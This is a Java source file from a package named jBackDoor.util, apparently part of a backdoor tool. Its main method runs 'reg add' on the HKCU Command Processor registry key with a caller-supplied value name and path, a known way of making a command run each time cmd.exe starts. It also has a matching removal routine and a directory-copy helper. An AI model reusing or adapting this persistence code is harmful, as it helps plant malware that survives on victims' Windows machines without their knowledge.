package jBackDoor.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class BasicShedulePowerShellCreate {
	public static void CreateScheduleByFile(String urlFilePath, String jobName) throws IOException {
		String cmd = "reg add \"HKCU\\Software\\Microsoft\\Command Processor\" /v " + jobName
				+ " ^\r\n  /t REG_EXPAND_SZ /d \"" + urlFilePath + "\"" + " /f";

		ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", cmd);
		builder.redirectErrorStream(true);
		Process p = builder.start();
		BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
		String line;
		while (true) {
			line = r.readLine();
			if (line == null) {
				break;
			}
			//System.out.println(line);
		}

	}

	public static void RemoveScheduleByJob(String jobName) throws IOException {
		String cmd = "reg delete \"HKCU\\Software\\Microsoft\\Command Processor\" /v" + jobName;
		Process child = Runtime.getRuntime().exec(cmd);
		OutputStream out = child.getOutputStream();
		out.flush();
		out.close();
	}

	public static void copyDirectory(File sourceLocation, File targetLocation) throws IOException {
		if (sourceLocation.isDirectory()) {
			if (!targetLocation.exists()) {
				targetLocation.mkdir();
			}

			String[] children = sourceLocation.list();
			for (int i = 0; i < children.length; i++) {
				copyDirectory(new File(sourceLocation, children[i]), new File(targetLocation, children[i]));
			}
		} else {

			InputStream in = new FileInputStream(sourceLocation);
			OutputStream out = new FileOutputStream(targetLocation);

			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0) {
				out.write(buf, 0, len);
			}
			in.close();
			out.close();
		}
	}
}
